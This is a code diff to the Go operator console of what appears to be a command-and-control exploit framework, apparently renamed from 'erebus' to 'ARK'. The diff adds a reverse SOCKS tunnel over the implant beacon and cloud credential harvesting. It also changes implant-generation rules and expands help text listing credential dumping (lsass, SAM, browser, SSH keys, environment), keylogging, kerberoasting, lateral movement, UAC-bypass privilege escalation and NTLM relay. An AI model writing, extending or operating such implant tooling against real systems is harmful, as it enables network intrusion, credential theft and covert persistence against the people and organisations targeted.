@@ -8,7 +8,7 @@ import (
 	"strings"
 	"time"
 
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -65,12 +65,15 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"smb":             c.cmdSMB,
 		"persist":         c.cmdPersist,
 		"privesc":         c.cmdPrivesc,
+		"cloud":           c.cmdCloud,
 		"mqtt":            c.cmdMQTT,
 		"relay":           c.cmdRelay,
 		"ldap":            c.cmdHostLDAP,
 		"ad":              c.cmdHostAD,
 		"host-smb":        c.cmdHostSMB,
 		"inbound":         c.cmdInbound,
+		"adcs":            c.cmdADCS,
+		"socks":           c.cmdSocks,
 		"exit":            c.cmdExit,
 		"help":            c.cmdHelp,
 	}
@@ -435,7 +438,10 @@ func (c *Commands) cmdGenerate(args []string) error {
 		callbacks = []string{"https://127.0.0.1:443"}
 	}
 	if language == "c" && osName != "windows" && osName != "linux" {
-		return fmt.Errorf("language c supports windows|linux (got %s); use --language go for %s", osName, osName)
+		return fmt.Errorf("language c supports windows|linux (got %s)", osName)
+	}
+	if language == "go" && (osName == "linux" || osName == "darwin") {
+		return fmt.Errorf("go implant on %s is archived; use --language c", osName)
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
@@ -706,6 +712,31 @@ func (c *Commands) cmdKeylog(args []string) error {
 	return nil
 }
 
+func (c *Commands) cmdSocks(args []string) error {
+	if len(args) < 1 {
+		return fmt.Errorf("usage: socks <start|stop> [--port 1080]")
+	}
+	switch strings.ToLower(args[0]) {
+	case "start":
+		port := uint32(1080)
+		if err := parseKVFlags(args[1:], map[string]func(string){
+			"--port": func(v string) {
+				n, err := strconv.ParseUint(v, 10, 32)
+				if err == nil && n > 0 {
+					port = uint32(n)
+				}
+			},
+		}); err != nil {
+			return err
+		}
+		return c.runTypedTask(pb.TaskType_TASK_SOCKS_START, &pb.SocksStartTask{Port: port}, true, printTypedResult)
+	case "stop":
+		return c.runTypedTask(pb.TaskType_TASK_SOCKS_STOP, &pb.SocksStopTask{}, true, printTypedResult)
+	default:
+		return fmt.Errorf("usage: socks <start|stop> [--port 1080]")
+	}
+}
+
 func (c *Commands) cmdInject(args []string) error {
 	return fmt.Errorf("inject: use the gRPC API directly for binary injection payloads")
 }
@@ -738,7 +769,7 @@ func (c *Commands) cmdHelp(_ []string) error {
   kerberos with-skew --dc <host> -- <cmd...> - run cmd under libfaketime to match DC clock
   kerberoast --domain <d> --dc <dc> --user <u> --pass <p>
   asreproast --domain <d> --dc <dc>
-  creds-dump <lsass|sam|browser>
+  creds-dump <lsass|sam|browser|ssh_keys|history|env|files>
   lateral <wmi|winrm|psexec> <target> <command> [--user u] [--pass p] [--hash h]
   smb <list_shares|list_dir|download> --host h [--share s] [--path p] [--user u] [--pass p] [--hash h] [--anon]
   ldap-enum <query_type> --domain d --dc dc [--user u] [--pass p] [--hash h]
@@ -746,7 +777,9 @@ func (c *Commands) cmdHelp(_ []string) error {
   privesc <token|uac_fodhelper|uac_eventvwr> [--pid n] [--command c]
   mqtt <sub|pub|healthcheck-hijack> ...  - Pre-implant MQTT (no session; see: mqtt help)
   relay http <start|sessions|get|status> - Pre-implant HTTP NTLM relay (no session)
-  inbound [status|env|tunnel]   - tun0 / SOCKS env / reverse tunnel (no session)
+  inbound [status|env|drop|through|close|tunnel] - C2 reachability / SOCKS env
+  socks <start|stop> [--port 1080] - reverse SOCKS over the C implant beacon
+  cloud <aws|azure|all> [env|creds|cli|all] - Linux C cloud harvest
   ldap <bind|enum|dangling> ... - Host-side LDAP (no session; see: ldap help)
   host-smb <shares|ls|get> ...  - Host-side SMB (no session; implant smb still needs use)
   ad password ...               - Host-side ForceChangePassword (see: ad help)
